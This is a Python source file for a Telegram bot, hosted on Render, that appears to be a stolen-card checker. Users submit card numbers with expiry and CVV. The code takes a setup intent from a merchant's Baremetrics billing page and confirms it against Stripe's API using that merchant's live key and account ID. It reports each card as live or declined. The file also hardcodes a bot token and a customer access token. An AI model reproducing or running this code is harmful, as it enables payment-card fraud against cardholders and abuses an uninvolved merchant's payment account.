import telebot
import os
import requests
import json
from datetime import datetime
from flask import Flask, request
import threading

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8480622059:AAHKRrUQK6Gw0ACZLiBLYwc9Cf9laodogVM")
AUTHOR = os.getenv("AUTHOR", "@FAHIM0200")
YOUR_RENDER_URL = "https://bot-py-pg6h.onrender.com"  # Your Render URL

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Store setup intent data
current_setup_intent = None
setup_intent_creation_time = None

# ========== API CONFIGURATION ==========
API_1_URL = "https://dunning.baremetrics.com/card_updates/stripe_setup_intent"
API_1_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-ch-ua': "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
    'DNT': "1",
    'sec-ch-ua-mobile': "?1",
    'Origin': "https://brainfm.baremetrics.com",
    'Sec-Fetch-Site': "same-site",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://brainfm.baremetrics.com/",
    'Accept-Language': "en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
}

API_1_PAYLOAD = {
    "token": "eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5X2lkIjoiOGM5YjcyNGYtZjY5NS00MDYxLTgxNmMtOTZjNjJmNmQ1NjNkIiwiY3VzdG9tZXJfb2lkIjoiY3VzX1RTUHVDN3ZqM3l0TWw0IiwiZXhwIjoxNzcwMjIyMjk5fQ.CcXC9IIpVzZ37lQCT-E4B0HNRMO1RwMqu6kdU-t7dx0"
}

API_2_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'sec-ch-ua-platform': "\"Android\"",
    'sec-ch-ua': "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
    'dnt': "1",
    'sec-ch-ua-mobile': "?1",
    'origin': "https://js.stripe.com",
    'sec-fetch-site': "same-site",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': "https://js.stripe.com/",
    'accept-language': "en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    'priority': "u=1, i"
}

# ========== FLASK APP ==========
app = Flask(__name__)

# ========== HELPER FUNCTIONS ==========
def get_setup_intent():
    """Get new setup intent from API 1"""
    global current_setup_intent, setup_intent_creation_time
    
    try:
        response = requests.post(
            API_1_URL,
            json=API_1_PAYLOAD,
            headers=API_1_HEADERS,
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            current_setup_intent = data['client_secret']
            setup_intent_creation_time = datetime.now()
            return True, "Setup intent created"
        else:
            return False, f"API 1 failed: {response.status_code}"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def safe_parse_json(response_text):
    """Safely parse JSON response"""
    try:
        return json.loads(response_text)
    except:
        return {'error': {'message': 'Invalid JSON', 'raw': response_text[:200]}}

def process_card(card_details, user_info):
    """Process a single card through both APIs"""
    global current_setup_intent
    
    # Parse card
    try:
        number, month, year, cvv = card_details.split('|')
        number = number.strip().replace(" ", "")
        month = month.strip()
        year = year.strip()
        cvv = cvv.strip()
        display_card = f"{number}|{month}|{year}|{cvv}"
    except:
        return False, "❌ Invalid format. Use: /p 4242424242424242|01|26|000"
    
    # Get setup intent if needed
    if not current_setup_intent:
        success, message = get_setup_intent()
        if not success:
            return False, f"❌ Setup intent failed: {message}"
    
    # Extract setup ID
    try:
        setup_id = current_setup_intent.split('_secret_')[0]
    except:
        return False, "❌ Invalid setup intent"
    
    # API 2 payload
    payload = {
        'return_url': "https://brainfm.baremetrics.com/?token=eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5X2lkIjoiOGM5YjcyNGYtZjY5NS00MDYxLTgxNmMtOTZjNjJmNmQ1NjNkIiwiY3VzdG9tZXJfb2lkIjoiY3VzX1RTUHVDN3ZqM3l0TWw0IiwiZXhwIjoxNzcwMjIyMjk5fQ.CcXC9IIpVzZ37lQCT-E4B0HNRMO1RwMqu6kdU-t7dx0",
        'payment_method_data[type]': "card",
        'payment_method_data[card][number]': number,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_year]': year,
        'payment_method_data[card][exp_month]': month,
        'payment_method_data[allow_redisplay]': "unspecified",
        'payment_method_data[billing_details][address][country]': "BD",
        'payment_method_data[referrer]': "https://brainfm.baremetrics.com",
        'payment_method_data[time_on_page]': "45638",
        'payment_method_data[client_attribution_metadata][client_session_id]': "2168281b-a4bf-461f-bec0-53a892f3c724",
        'payment_method_data[client_attribution_metadata][merchant_integration_source]': "elements",
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': "payment-element",
        'payment_method_data[client_attribution_metadata][merchant_integration_version]': "2021",
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': "deferred",
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': "automatic",
        'payment_method_data[client_attribution_metadata][elements_session_config_id]': "e9055688-6ac8-4ff8-9282-7337341fc7cb",
        'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]': "payment",
        'payment_method_data[guid]': "72106b58-27c8-4c69-ba35-8935bcc26153dd7a43",
        'payment_method_data[muid]': "f6fc48a9-c615-446b-9abf-377cab042497732b0c",
        'payment_method_data[sid]': "008ac029-9fd1-4983-857f-9365f0fc1d3cfc79a8",
        'expected_payment_method_type': "card",
        'client_context[currency]': "usd",
        'client_context[mode]': "setup",
        'client_context[setup_future_usage]': "off_session",
        'use_stripe_sdk': "false",
        'key': "pk_live_1eXe8nRGR4EcWNQSTsgrLFxb",
        '_stripe_account': "acct_15epmsDxyvLufNfy",
        'client_attribution_metadata[client_session_id]': "2168281b-a4bf-461f-bec0-53a892f3c724",
        'client_attribution_metadata[merchant_integration_source]': "elements",
        'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
        'client_attribution_metadata[merchant_integration_version]': "2021",
        'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
        'client_attribution_metadata[payment_method_selection_flow]': "automatic",
        'client_attribution_metadata[elements_session_config_id]': "e9055688-6ac8-4ff8-9282-7337341fc7cb",
        'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
        'client_secret': current_setup_intent
    }
    
    # Call API 2
    api2_url = f"https://api.stripe.com/v1/setup_intents/{setup_id}/confirm"
    
    try:
        response = requests.post(
            api2_url,
            data=payload,
            headers=API_2_HEADERS,
            timeout=30
        )
        
        response_data = safe_parse_json(response.text)
        
        # Handle setup intent errors
        if isinstance(response_data, dict) and 'error' in response_data:
            error_code = response_data['error'].get('code', '')
            
            if error_code == 'setup_intent_unexpected_state':
                success, message = get_setup_intent()
                if success:
                    setup_id = current_setup_intent.split('_secret_')[0]
                    payload['client_secret'] = current_setup_intent
                    api2_url = f"https://api.stripe.com/v1/setup_intents/{setup_id}/confirm"
                    
                    response = requests.post(api2_url, data=payload, headers=API_2_HEADERS, timeout=30)
                    response_data = safe_parse_json(response.text)
                else:
                    return False, f"❌ Setup intent failed: {message}"
        
        # Parse response
        if isinstance(response_data, dict) and 'error' in response_data:
            # Card declined
            error_data = response_data.get('error', {})
            decline_code = error_data.get('decline_code', 'unknown') if isinstance(error_data, dict) else 'unknown'
            error_message = error_data.get('message', 'Unknown error') if isinstance(error_data, dict) else str(error_data)
            
            result = f"""❌ *DECLINED*

*Card:* `{display_card}`
*Decline Code:* `{decline_code}`
*Message:* {error_message}

*User:* {user_info}
*Author:* {AUTHOR}
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━"""
            
            return False, result
            
        elif isinstance(response_data, dict) and 'status' in response_data:
            # Success
            payment_method = response_data.get('payment_method', {})
            card_info = payment_method.get('card', {}) if isinstance(payment_method, dict) else {}
            
            result = f"""✅ *SUCCESS!*

*Card:* `{display_card}`
*Status:* `{response_data.get('status', 'unknown')}`"""
            
            if isinstance(card_info, dict):
                result += f"\n*Last 4:* `{card_info.get('last4', 'N/A')}`"
                brand = card_info.get('brand', 'N/A')
                result += f"\n*Brand:* `{brand.upper() if isinstance(brand, str) else 'N/A'}`"
                result += f"\n*Country:* `{card_info.get('country', 'N/A')}`"
            
            result += f"""

*User:* {user_info}
*Author:* {AUTHOR}
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━"""
            
            return True, result
            
        else:
            # Unexpected response
            result = f"""⚠️ *UNEXPECTED RESPONSE*

*Card:* `{display_card}`
*Response:* `{str(response_data)[:200]}`

*User:* {user_info}
*Author:* {AUTHOR}
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━"""
            
            return False, result
            
    except Exception as e:
        return False, f"❌ Error: {str(e)[:200]}"

# ========== TELEGRAM HANDLERS ==========
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    """Welcome message"""
    welcome = f"""🤖 *Card Processor Bot*

*Author:* {AUTHOR}
*Server:* {YOUR_RENDER_URL}

*Commands:*
`/p CARD|MM|YY|CVV` - Process card
`.p CARD|MM|YY|CVV` - Process card (dot command)
`/status` - Check bot status
`/debug` - Test connection

*Format:* number|month|year|cvv
*Example:* `/p 4242424242424242|01|26|000`
"""
    bot.reply_to(message, welcome, parse_mode='Markdown')

@bot.message_handler(commands=['debug', 'test'])
def debug_command(message):
    """Debug connection"""
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"User {message.from_user.id}"
    debug_msg = f"""🔧 *Debug Info*

*User:* {user_info}
*Bot:* Online ✅
*Server:* {YOUR_RENDER_URL}
*Author:* {AUTHOR}
*Time:* {datetime.now().strftime('%H:%M:%S')}

Try processing a test card!
"""
    bot.reply_to(message, debug_msg, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    """Check bot status"""
    if current_setup_intent and setup_intent_creation_time:
        age = datetime.now() - setup_intent_creation_time
        status_msg = f"""🔄 *Bot Status*

*Setup Intent:* Active
*Created:* {setup_intent_creation_time.strftime('%H:%M:%S')}
*Age:* {age.seconds} seconds
*Author:* {AUTHOR}
*Server:* {YOUR_RENDER_URL}"""
    else:
        status_msg = f"""❌ *No active Setup Intent*

Use `/p` command to create one.
*Author:* {AUTHOR}
*Server:* {YOUR_RENDER_URL}"""
    
    bot.reply_to(message, status_msg, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle .p and /p commands"""
    text = message.text.strip()
    
    # Check for card commands
    if text.startswith('.p ') or text.startswith('.P ') or text.startswith('/p ') or text.startswith('/P '):
        card_details = text[3:].strip()
        
        # Validate format
        if '|' not in card_details or len(card_details.split('|')) != 4:
            bot.reply_to(message, "❌ Invalid format. Use: `/p 4242424242424242|01|26|000`", parse_mode='Markdown')
            return
        
        # Get user info
        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        user_info = f"{username} ({message.from_user.id})"
        
        # Send processing message
        processing_msg = bot.reply_to(message, "🔄 *Processing card...*", parse_mode='Markdown')
        
        # Process in background thread
        def process_in_background():
            success, result = process_card(card_details, user_info)
            
            # Delete processing message
            try:
                bot.delete_message(processing_msg.chat.id, processing_msg.message_id)
            except:
                pass
            
            # Send result
            bot.reply_to(message, result, parse_mode='Markdown')
        
        # Start thread
        thread = threading.Thread(target=process_in_background)
        thread.start()

# ========== FLASK ROUTES ==========
@app.route('/')
def home():
    """Home page"""
    return f"""
    <html>
        <head>
            <title>🤖 Card Processor Bot</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #f5f5f5;
                }}
                .container {{
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }}
                h1 {{ color: #333; }}
                .status {{ 
                    color: #28a745; 
                    font-weight: bold;
                    font-size: 18px;
                }}
                .info {{ 
                    background: #e9ecef; 
                    padding: 15px; 
                    border-radius: 5px; 
                    margin: 15px 0;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 Card Processor Bot</h1>
                <p class="status">✅ Online & Running</p>
                
                <div class="info">
                    <p><strong>Author:</strong> {AUTHOR}</p>
                    <p><strong>Server:</strong> {YOUR_RENDER_URL}</p>
                    <p><strong>Telegram Bot:</strong> @FAHIM0200</p>
                </div>
                
                <h3>📱 How to use:</h3>
                <ol>
                    <li>Open Telegram</li>
                    <li>Find the bot</li>
                    <li>Send: <code>/p 4242424242424242|01|26|000</code></li>
                </ol>
                
                <p><em>Bot processes cards through Stripe APIs in real-time.</em></p>
            </div>
        </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'Bad request', 400

@app.route('/health')
def health():
    """Health check endpoint"""
    return {'status': 'healthy', 'author': AUTHOR, 'server': YOUR_RENDER_URL}, 200

# ========== MAIN ==========
if __name__ == '__main__':
    print("=" * 50)
    print("🤖 Card Processor Bot")
    print("=" * 50)
    print(f"Author: {AUTHOR}")
    print(f"Server: {YOUR_RENDER_URL}")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print("=" * 50)
    
    # Auto-set webhook for Render
    try:
        # Remove any existing webhook
        bot.remove_webhook()
        
        # Set new webhook
        webhook_url = f"{YOUR_RENDER_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        print(f"✅ Webhook set to: {webhook_url}")
        
        # Test webhook
        webhook_info = bot.get_webhook_info()
        print(f"📡 Webhook info: {webhook_info.url}")
    except Exception as e:
        print(f"⚠️ Webhook setup failed: {e}")
        print("📝 Set webhook manually:")
        print(f"curl 'https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={YOUR_RENDER_URL}/webhook'")
    
    print("🚀 Bot is starting...")
    
    # Start Flask server
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
